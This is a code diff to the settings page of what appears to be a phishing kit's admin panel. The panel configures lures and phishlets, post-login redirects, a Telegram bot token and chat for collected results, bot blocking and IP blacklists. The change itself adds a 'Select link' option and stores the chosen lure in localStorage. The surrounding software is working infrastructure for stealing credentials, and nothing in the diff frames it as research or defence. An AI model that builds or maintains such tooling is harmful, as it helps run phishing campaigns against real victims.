@@ -92,6 +92,9 @@ export default function Settings() {
     const fetchSettings = async () => {
       try {
         setLoading(true);
+        // Get saved lure ID from localStorage if it exists
+        const savedLureId = localStorage.getItem("selectedLureId");
+
         const [
           telegramResponse,
           securityResponse,
@@ -124,19 +127,65 @@ export default function Settings() {
 
         setLures(luresData.lures || []);
 
-        // Find the lure that matches the current link path
-        const currentLure = luresData.lures?.find(
-          (lure) =>
-            lure.path === `/${linkData.linkPath}` ||
-            lure.path === linkData.linkPath
-        );
+        // If there are lures available
+        if (luresData.lures && luresData.lures.length > 0) {
+          let lureToSelect: Lure | null = null;
 
-        if (currentLure) {
-          setSelectedLure(currentLure);
-        } else if (luresData.lures && luresData.lures.length > 0) {
-          setSelectedLure(luresData.lures[0]);
+          // First try to use the saved lure ID from localStorage
+          if (savedLureId) {
+            const savedLure = luresData.lures.find(
+              (lure) => lure.id === savedLureId
+            );
+            if (savedLure) {
+              lureToSelect = savedLure;
+            }
+          }
+
+          // If no saved lure found, try to match with current link path
+          if (!lureToSelect) {
+            const currentLure = luresData.lures.find(
+              (lure) =>
+                lure.path === `/${linkData.linkPath}` ||
+                lure.path === linkData.linkPath
+            );
+
+            if (currentLure) {
+              lureToSelect = currentLure;
+            }
+          }
+
+          // Set the selected lure
+          if (lureToSelect) {
+            setSelectedLure(lureToSelect);
+
+            // Update form fields with the selected lure values
+            const cleanPath = lureToSelect.path.startsWith("/")
+              ? lureToSelect.path.substring(1)
+              : lureToSelect.path;
+
+            // Update our local copy of link data before setting state
+            const updatedLinkPath = cleanPath;
+            const updatedRedirect =
+              lureToSelect.redirect_url || linkData.afterLoginRedirect;
+
+            // Then use these values when setting state
+            setSettings((prev) => ({
+              ...prev,
+              telegramToken: telegramData.bot_token || "",
+              telegramChatId: telegramData.chat_id || "",
+              blockBots: securityData.blockBots,
+              botRedirectLink: securityData.redirectUrl || "",
+              afterLoginRedirect: updatedRedirect,
+              useCaptcha: linkData.useCaptcha,
+              linkPath: updatedLinkPath,
+              blacklistedIPs: blacklistData.ips || [],
+            }));
+
+            return; // Exit early as we've already set the state
+          }
         }
 
+        // Default state setting if no lure was selected
         setSettings((prev) => ({
           ...prev,
           telegramToken: telegramData.bot_token || "",
@@ -436,11 +485,29 @@ export default function Settings() {
   };
 
   const handleLureChange = (lureId: string) => {
+    // If "Select link" option is chosen, clear the selected lure
+    if (lureId === "-1") {
+      setSelectedLure(null);
+      localStorage.removeItem("selectedLureId");
+
+      // Reset the form fields
+      setSettings((prev) => ({
+        ...prev,
+        linkPath: "",
+        afterLoginRedirect: "",
+      }));
+
+      return;
+    }
+
     const selectedLureIndex = lures.findIndex((lure) => lure.id === lureId);
     if (selectedLureIndex === -1) return;
 
     const selected = lures[selectedLureIndex];
     setSelectedLure(selected);
+
+    // Save the selected lure ID to localStorage
+    localStorage.setItem("selectedLureId", selected.id);
 
     // Update the link path input with the selected lure's path
     const cleanPath = selected.path.startsWith("/")
@@ -662,9 +729,10 @@ export default function Settings() {
               {lures.length > 0 ? (
                 <select
                   className="w-full bg-[#1B2028] text-white p-3 rounded mb-4"
-                  value={selectedLure?.id || ""}
+                  value={selectedLure?.id || "-1"}
                   onChange={(e) => handleLureChange(e.target.value)}
                 >
+                  <option value="-1">Select link</option>
                   {lures.map((lure) => (
                     <option key={lure.id} value={lure.id}>
                       {lure.phishlet} - {lure.path}
